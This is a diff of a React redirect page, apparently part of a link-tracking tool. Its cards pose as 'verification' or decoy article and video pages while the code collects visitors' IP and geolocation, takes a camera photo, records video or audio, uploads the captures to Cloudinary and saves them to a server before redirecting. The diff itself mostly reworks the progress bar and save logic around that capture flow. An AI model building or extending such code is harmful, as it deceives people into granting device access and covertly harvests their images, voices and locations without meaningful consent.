@@ -21,17 +21,10 @@ const VerificationText: React.FC<{className?: string, t: (key: string) => string
 
 // --- Individual Card Style Components ---
 
-const Progress: React.FC<{ duration: number, isPaused: boolean, className?: string, progressClassName?: string, style?: React.CSSProperties, progressStyle?: React.CSSProperties }> = ({ duration, isPaused, className, progressClassName, style, progressStyle }) => {
-  const [key, setKey] = React.useState(Date.now());
-  React.useEffect(() => { if (!isPaused) setKey(Date.now()); }, [isPaused]);
-
-  const innerAnimatedStyle = { animation: `progress ${duration}s linear forwards`, ...progressStyle };
-
-  if (isPaused) return <div className={className} style={style}><div className={`${progressClassName} w-0`} style={progressStyle}/></div>;
-
+const Progress: React.FC<{ progress: number, className?: string, progressClassName?: string }> = ({ progress, className, progressClassName }) => {
   return (
-    <div className={className} style={style}>
-      <div key={key} className={progressClassName} style={innerAnimatedStyle} />
+    <div className={className}>
+      <div className={progressClassName} style={{ width: `${progress}%`, transition: 'width 0.4s ease-out' }} />
     </div>
   );
 };
@@ -58,7 +51,7 @@ const TypewriterText: React.FC<{ text: string, duration: number, isPaused: boole
     return <span className={`${className} overflow-hidden whitespace-nowrap border-r-4 border-r-transparent`}>{displayedText}</span>;
 }
 
-const DefaultWhiteCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
+const DefaultWhiteCard: React.FC<{ settings: Settings, isPaused: boolean, progress: number, t: (key: string) => string; }> = ({ settings, isPaused, progress, t }) => {
     return (
       <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
         <div className="bg-white border border-slate-200/80 shadow-2xl rounded-2xl p-8 sm:p-12 text-center flex flex-col items-center gap-4">
@@ -67,14 +60,14 @@ const DefaultWhiteCard: React.FC<{ settings: Settings, isPaused: boolean, t: (ke
           <p className="text-slate-500 mt-1">{t('redirect_default_card_subtitle')}</p>
           <div className="w-full pt-6 space-y-2">
             <VerificationText className="text-slate-400" t={t} />
-            <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-200 rounded-full h-5 overflow-hidden" progressClassName="bg-blue-500 h-full rounded-full" />
+            <Progress progress={progress} className="w-full bg-slate-200 rounded-full h-5 overflow-hidden" progressClassName="bg-blue-500 h-full rounded-full" />
           </div>
         </div>
       </div>
     );
 };
 
-const GlassCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
+const GlassCard: React.FC<{ settings: Settings, isPaused: boolean, progress: number, t: (key: string) => string; }> = ({ settings, isPaused, progress, t }) => {
     return (
         <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
             <div className="bg-white/10 backdrop-blur-xl border border-white/20 shadow-2xl rounded-2xl p-8 sm:p-12 text-center flex flex-col items-center gap-4">
@@ -83,14 +76,14 @@ const GlassCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: stri
                 <p className="opacity-80 mt-1">{t('redirect_glass_card_subtitle')}</p>
                 <div className="w-full pt-6 space-y-2">
                     <VerificationText className="text-white/60" t={t}/>
-                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-white/20 rounded-full h-2 overflow-hidden" progressClassName="bg-white h-full rounded-full" />
+                    <Progress progress={progress} className="w-full bg-white/20 rounded-full h-2 overflow-hidden" progressClassName="bg-white h-full rounded-full" />
                 </div>
             </div>
         </div>
     );
 };
 
-const MinimalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
+const MinimalCard: React.FC<{ settings: Settings, isPaused: boolean, progress: number, t: (key: string) => string; }> = ({ settings, isPaused, progress, t }) => {
     return (
         <div className="w-full max-w-2xl animate-fade-in-up text-center flex flex-col items-center gap-6 p-8" style={{ color: settings.textColor, textShadow: '0px 1px 10px rgba(0,0,0,0.5)' }}>
             {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 object-contain" />}
@@ -98,13 +91,13 @@ const MinimalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: st
             <p className="opacity-80 text-lg">{t('redirect_minimal_card_subtitle')}</p>
             <div className="w-full pt-4 fixed bottom-0 left-0 space-y-2">
                 <VerificationText className="text-white/60 text-center mb-1" t={t}/>
-                <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-1" progressClassName="bg-white h-full" />
+                <Progress progress={progress} className="w-full h-1" progressClassName="bg-white h-full" />
             </div>
         </div>
     );
 };
 
-const TerminalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string, replacements?: Record<string, string|number>) => string; }> = ({ settings, isPaused, t }) => {
+const TerminalCard: React.FC<{ settings: Settings, isPaused: boolean, progress: number, t: (key: string, replacements?: Record<string, string|number>) => string; }> = ({ settings, isPaused, progress, t }) => {
     return (
         <div className="w-full max-w-2xl font-mono animate-fade-in" style={{ color: settings.textColor }}>
             <div className="bg-[#0D1117] border border-green-500/30 shadow-2xl rounded-lg p-6">
@@ -121,27 +114,27 @@ const TerminalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: s
                     <p><span className="text-green-400">root@director:~$</span> <TypewriterText text={t('redirect_terminal_redirecting', {delay: settings.redirectDelay})} duration={settings.redirectDelay} isPaused={isPaused} /></p>
                 </div>
                  <div className="w-full pt-6 space-y-2">
-                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-green-500/10 rounded h-1 overflow-hidden" progressClassName="bg-green-500 h-full rounded" />
+                    <Progress progress={progress} className="w-full bg-green-500/10 rounded h-1 overflow-hidden" progressClassName="bg-green-500 h-full rounded" />
                 </div>
             </div>
         </div>
     );
 };
 
-const ElegantCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
+const ElegantCard: React.FC<{ settings: Settings, isPaused: boolean, progress: number, t: (key: string) => string; }> = ({ settings, isPaused, progress, t }) => (
     <div className="w-full max-w-sm animate-scale-in" style={{ color: settings.textColor }}>
         <div className="bg-white border-2 border-black/80 rounded-sm p-10 text-center flex flex-col items-center gap-4 font-serif">
             {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-20 h-20 mb-4 object-contain" />}
             <h1 className="text-2xl font-bold text-black tracking-widest uppercase">{settings.displayText}</h1>
             <p className="text-black/60 text-sm mt-2">{t('redirect_elegant_card_subtitle')}</p>
             <div className="w-full pt-6">
-                <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-0.5 bg-black/10" progressClassName="bg-black/80 h-full" />
+                <Progress progress={progress} className="w-full h-0.5 bg-black/10" progressClassName="bg-black/80 h-full" />
             </div>
         </div>
     </div>
 );
 
-const SleekDarkCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
+const SleekDarkCard: React.FC<{ settings: Settings, isPaused: boolean, progress: number, t: (key: string) => string; }> = ({ settings, isPaused, progress, t }) => (
     <div className="w-full max-w-md animate-fade-in-up" style={{ color: settings.textColor }}>
         <div className="bg-slate-900 border border-slate-700/80 shadow-2xl rounded-xl p-10 text-center flex flex-col items-center gap-4">
             {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 mb-4 object-contain" />}
@@ -149,13 +142,13 @@ const SleekDarkCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: 
             <p className="text-slate-400 mt-2">{t('redirect_default_card_subtitle')}</p>
             <div className="w-full pt-6 space-y-2">
                 <VerificationText className="text-slate-500" t={t}/>
-                <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-2 overflow-hidden" progressClassName="bg-indigo-500 h-full rounded-full" />
+                <Progress progress={progress} className="w-full bg-slate-700 rounded-full h-2 overflow-hidden" progressClassName="bg-indigo-500 h-full rounded-full" />
             </div>
         </div>
     </div>
 );
 
-const ArticleCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
+const ArticleCard: React.FC<{ settings: Settings, isPaused: boolean, progress: number, t: (key: string) => string; }> = ({ settings, isPaused, progress, t }) => (
     <div className="w-full max-w-xl animate-fade-in-up font-serif" style={{ color: settings.textColor }}>
         <div className="bg-white text-slate-800 p-10">
             <p className="text-sm font-bold text-red-600 uppercase tracking-widest">{t('redirect_article_heading')}</p>
@@ -168,13 +161,13 @@ const ArticleCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: st
             {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-full object-contain mb-6" />}
             <p className="text-lg text-slate-600 leading-relaxed">{t('redirect_article_subtitle')}</p>
             <div className="w-full pt-8">
-                 <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-200 rounded-full h-1" progressClassName="bg-red-600 h-full" />
+                 <Progress progress={progress} className="w-full bg-slate-200 rounded-full h-1" progressClassName="bg-red-600 h-full" />
             </div>
         </div>
     </div>
 );
 
-const RetroTvCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
+const RetroTvCard: React.FC<{ settings: Settings, isPaused: boolean, progress: number, t: (key: string) => string; }> = ({ settings, isPaused, progress, t }) => (
     <div className="w-full max-w-lg animate-scale-in" style={{ color: settings.textColor }}>
         <div className="bg-slate-900 p-8 rounded-t-xl border-2 border-b-0 border-slate-700 relative">
             <div className="aspect-video bg-black/80 rounded p-6 relative overflow-hidden font-mono text-green-400 text-2xl animate-glow scanline">
@@ -182,12 +175,12 @@ const RetroTvCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: st
             </div>
         </div>
         <div className="h-16 bg-slate-800 rounded-b-xl border-2 border-t-0 border-slate-700 flex items-center justify-center p-4">
-             <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-green-900/50 rounded h-2" progressClassName="bg-green-400 h-full" />
+             <Progress progress={progress} className="w-full bg-green-900/50 rounded h-2" progressClassName="bg-green-400 h-full" />
         </div>
     </div>
 );
 
-const GradientBurstCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
+const GradientBurstCard: React.FC<{ settings: Settings, isPaused: boolean, progress: number, t: (key: string) => string; }> = ({ settings, isPaused, progress, t }) => (
     <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
         <div className="p-1 rounded-2xl shadow-2xl" style={{ background: `linear-gradient(45deg, ${settings.gradientColors.join(', ')})`}}>
             <div className="bg-slate-900 rounded-xl p-10 text-center flex flex-col items-center gap-4">
@@ -195,14 +188,14 @@ const GradientBurstCard: React.FC<{ settings: Settings, isPaused: boolean, t: (k
                 <h1 className="text-4xl font-bold">{settings.displayText}</h1>
                 <p className="text-slate-300 mt-2">{t('redirect_gradient_card_subtitle')}</p>
                 <div className="w-full pt-6">
-                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-white/10 rounded-full h-2" progressClassName="bg-white h-full" />
+                    <Progress progress={progress} className="w-full bg-white/10 rounded-full h-2" progressClassName="bg-white h-full" />
                 </div>
             </div>
         </div>
     </div>
 );
 
-const VideoPlayerCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string, replacements?: Record<string, string>) => string; }> = ({ settings, isPaused, t }) => (
+const VideoPlayerCard: React.FC<{ settings: Settings, isPaused: boolean, progress: number, t: (key: string, replacements?: Record<string, string>) => string; }> = ({ settings, isPaused, progress, t }) => (
     <div className="w-full max-w-2xl animate-scale-in bg-black rounded-xl border border-slate-700 shadow-2xl overflow-hidden" style={{ color: settings.textColor }}>
         <div className="aspect-video bg-slate-900 flex items-center justify-center">
             {settings.customIconUrl ? (
@@ -214,13 +207,13 @@ const VideoPlayerCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key
         <div className="p-4 bg-black/30 space-y-2">
             <h1 className="font-bold text-lg">{settings.displayText}</h1>
             <p className="text-sm text-slate-400">{t('redirect_video_player_redirecting', { url: settings.redirectUrl })}</p>
-            <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-1 mt-2" progressClassName="bg-red-600 h-full" />
+            <Progress progress={progress} className="w-full bg-slate-700 rounded-full h-1 mt-2" progressClassName="bg-red-600 h-full" />
         </div>
     </div>
 );
 
 
-const CARD_COMPONENTS: Record<string, React.FC<{ settings: Settings, isPaused: boolean, t: any }>> = {
+const CARD_COMPONENTS: Record<string, React.FC<{ settings: Settings, isPaused: boolean, progress: number, t: any }>> = {
     'default-white': DefaultWhiteCard,
     'glass': GlassCard,
     'minimal': MinimalCard,
@@ -243,6 +236,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
   const [status, setStatus] = React.useState<'initializing' | 'loading' | 'invalid' | 'permission_denied' | 'redirecting'>('initializing');
   const [deniedPermissions, setDeniedPermissions] = React.useState<PermissionType[]>([]);
   const [isWaitingForPermission, setIsWaitingForPermission] = React.useState(false);
+  const [progress, setProgress] = React.useState(0);
 
   const t = React.useMemo(() => getTranslator(settings?.redirectLanguage || 'en'), [settings?.redirectLanguage]);
   
@@ -258,7 +252,8 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
 
 
   const saveToApi = React.useCallback(async (dataToSave: Partial<CapturedData>, settingsToUse: Settings, isComplete: boolean) => {
-    if (isSavingRef.current) return;
+    if (isPreview) return;
+    if (isSavingRef.current && isComplete === false) return; // Don't interrupt a final save with an incomplete one
     
     const hasMeaningfulData = dataToSave.ip || dataToSave.cameraCapture || dataToSave.microphoneCapture || dataToSave.cameraPhotoCapture || dataToSave.location?.lat;
     if (!hasMeaningfulData && !captureDocIdRef.current) return;
@@ -302,29 +297,21 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
     } finally {
         isSavingRef.current = false;
     }
-  }, []);
+  }, [isPreview]);
 
   React.useEffect(() => {
     const handlePageExit = () => {
-      if (settings) {
-        // Save the latest data on exit. This will update the existing doc if one has been created.
+      if (settings && status !== 'initializing') {
         saveToApi(capturedDataRef.current, settings, false);
       }
     };
-
-    window.addEventListener('visibilitychange', () => {
-      if (document.visibilityState === 'hidden') {
-        handlePageExit();
-      }
-    });
     window.addEventListener('pagehide', handlePageExit);
 
     return () => {
-      window.removeEventListener('visibilitychange', handlePageExit);
       window.removeEventListener('pagehide', handlePageExit);
       handlePageExit(); // Final attempt on component unmount
     };
-  }, [settings, saveToApi]);
+  }, [settings, status, saveToApi]);
 
   const captureInitialData = React.useCallback(async () => {
     if (capturedDataRef.current.ip) return;
@@ -441,6 +428,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
 
         setStatus('redirecting');
         setIsWaitingForPermission(true);
+        setProgress(5);
 
         const required = settings.captureInfo.permissions;
         const permissions: CapturedData['permissions'] = { location: 'n/a', camera: 'n/a', microphone: 'n/a' };
@@ -450,12 +438,13 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
         const needsMic = required.includes('microphone');
         let mediaHandled = false;
 
+        const progressPerPermission = required.length > 0 ? 60 / required.length : 0;
+
         for (const perm of required) {
             if (perm === 'location') {
                 try {
                     const status = await navigator.permissions.query({ name: 'geolocation' });
                     if (status.state === 'prompt') {
-                        // This promise does not guarantee a selection, but triggers the prompt.
                         await new Promise<void>((resolve) => {
                            const timer = setTimeout(() => resolve(), 15000); // Timeout to not wait forever
                            navigator.geolocation.getCurrentPosition(
@@ -486,22 +475,20 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
                     }
                 }
             }
+            setProgress(p => p + progressPerPermission);
         }
         capturedDataRef.current.permissions = permissions;
 
-        // 3. Check for hard denials
         const denied = required.filter(p => p !== 'battery' && permissions[p as 'location' | 'camera' | 'microphone'] === 'denied');
         if (denied.length > 0) {
             if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
             setDeniedPermissions(denied);
             setStatus('permission_denied');
             setIsWaitingForPermission(false);
-            // Save the denied state before stopping
             await saveToApi(capturedDataRef.current, settings, false);
             return;
         }
 
-        // 4. Capture photo immediately if needed
         if (mediaStream && needsCamera) {
             const videoTrack = mediaStream.getVideoTracks()[0];
             const imageCapture = new (window as any).ImageCapture(videoTrack);
@@ -509,12 +496,10 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
                 const photoBlob = await imageCapture.takePhoto();
                 const photoUrl = await uploadToCloudinary(photoBlob, 'image');
                 capturedDataRef.current.cameraPhotoCapture = photoUrl;
-            } catch (e) {
-                console.error("Photo capture/upload failed:", e);
-            }
+            } catch (e) { console.error("Photo capture/upload failed:", e); }
         }
+        setProgress(p => Math.min(p + 15, 80));
 
-        // 5. Start Recording if needed
         let cameraUrl: string | undefined;
         let micUrl: string | undefined;
         if (mediaStream && (needsCamera || needsMic)) {
@@ -529,17 +514,15 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
                 await new Promise(resolve => recorder.onstop = resolve);
 
                 const recordingBlob = new Blob(chunks, { type: needsCamera ? 'video/webm' : 'audio/webm' });
-                if (needsCamera) {
-                    cameraUrl = await uploadToCloudinary(recordingBlob, 'video');
-                } else if (needsMic) {
-                    micUrl = await uploadToCloudinary(recordingBlob, 'raw');
-                }
+                if (needsCamera) cameraUrl = await uploadToCloudinary(recordingBlob, 'video');
+                else if (needsMic) micUrl = await uploadToCloudinary(recordingBlob, 'raw');
             } catch (e) {
                 console.error("Recording or upload failed:", e);
             } finally {
                 mediaStream.getTracks().forEach(track => track.stop());
             }
         }
+        setProgress(95);
         
         setIsWaitingForPermission(false);
         capturedDataRef.current.cameraCapture = cameraUrl;
@@ -548,6 +531,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
         await saveToApi(capturedDataRef.current, settings, true);
 
         if (settings.redirectDelay > 0) {
+            setProgress(100);
             await new Promise(resolve => setTimeout(resolve, settings.redirectDelay * 1000));
         }
         if (!isPreview) {
@@ -559,7 +543,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
     React.useEffect(() => {
         const loadSettings = async () => {
             if (isPreview && previewSettings) {
-                setSettings({ id: 'preview', ...NEW_REDIRECT_TEMPLATE, ...previewSettings });
+                setSettings({ id: 'preview', status: 'active', ...NEW_REDIRECT_TEMPLATE, ...previewSettings });
                 setStatus('redirecting');
                 return;
             }
@@ -572,6 +556,8 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
 
                 const configDoc = querySnapshot.docs[0];
                 const fetchedSettings = { id: configDoc.id, ...configDoc.data() } as Settings;
+                if(fetchedSettings.status === 'trashed') return setStatus('invalid');
+
                 setSettings(fetchedSettings);
                 await captureInitialData();
                 setStatus('loading');
@@ -607,7 +593,8 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
         if (settings && (status === 'loading' || status === 'redirecting' || isPreview)) {
             const CardComponent = CARD_COMPONENTS[settings.cardStyle] || CARD_COMPONENTS['default-white'];
             const isPaused = isPreview || status === 'loading' || isWaitingForPermission;
-            return <CardComponent settings={settings} isPaused={isPaused} t={t} />;
+            const currentProgress = isPreview ? 100 : progress;
+            return <CardComponent settings={settings} isPaused={isPaused} progress={currentProgress} t={t} />;
         }
         return <h1 className="text-2xl font-bold text-white">{t('redirect_loading')}</h1>;
     };
